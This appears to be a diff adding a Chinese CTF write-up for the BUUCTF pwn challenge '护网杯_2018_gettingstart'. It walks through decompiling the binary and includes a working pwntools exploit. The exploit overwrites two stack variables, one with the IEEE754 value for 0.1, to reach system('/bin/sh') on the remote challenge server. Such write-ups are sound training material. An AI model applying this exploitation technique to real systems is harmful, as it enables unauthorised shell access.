@@ -291,6 +291,47 @@ io.interactive()
 
 ------
 
+### [护网杯_2018_gettingstart](https://buuoj.cn/challenges#%E6%8A%A4%E7%BD%91%E6%9D%AF_2018_gettingstart)
+
+先`file ./2018_gettingstart`查看文件类型再`checksec --file=2018_gettingstart`检查了一下文件保护情况。
+
+![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/1.png)
+
+用`IDA Pro 64bit`打开附件`2018_gettingstart`，按`F5`反汇编源码并查看主函数，可以看到有个`char`型数组`buf`，`buf`的可用栈大小为`0x30`，`read()`函数读取输入到`buf`变量时限制的字节数为`0x28`，并不能构成栈溢出。
+
+注意到当`v5 == 0x7FFFFFFFFFFFFFFFLL && v6 == 0.1`这个条件成立时就会发生系统调用`system('/bin/sh')`。
+
+![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/2.png)
+
+分别双击`v5`和`v6`可以看到其在栈中的位置，构造`payload`时只需要将`v5`和`v6`重新赋值即可让主函数中的`if`条件成立。
+
+![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/3.png)
+
+`v5`的赋值直接就是`0x7FFFFFFFFFFFFFFF`，那么`v6 == 0.1`该怎么样用`16`进制数表示呢？可以在这个网站https://www.binaryconvert.com/result_double.html查看`0.1`用`IEEE754`双精度浮点数中的二进制格式。
+
+![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/4.png)
+
+当然也能在汇编源码中看到`ucomisd xmm0, cs:qword_C10`，双击`qword_C10`就能知道`0.1`在内存中的数值`0x3FB999999999999A`。
+
+![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/5.png)
+
+编写`Python`代码即可得到`flag{5113e012-2d92-4257-bf3a-f688df2841bf}`。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 27036)
+# io = process('./2018_gettingStart')
+payload = b'a'*(0x30-0x18) + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A)
+io.sendlineafter(b'But Whether it starts depends on you.\n', payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/6.png)
+
+------
+
 ### [bjdctf_2020_babystack](https://buuoj.cn/challenges#bjdctf_2020_babystack)
 
 先`file ./bjdctf_2020_babystack`查看文件类型再`checksec --file=bjdctf_2020_babystack`检查一下文件保护情况。
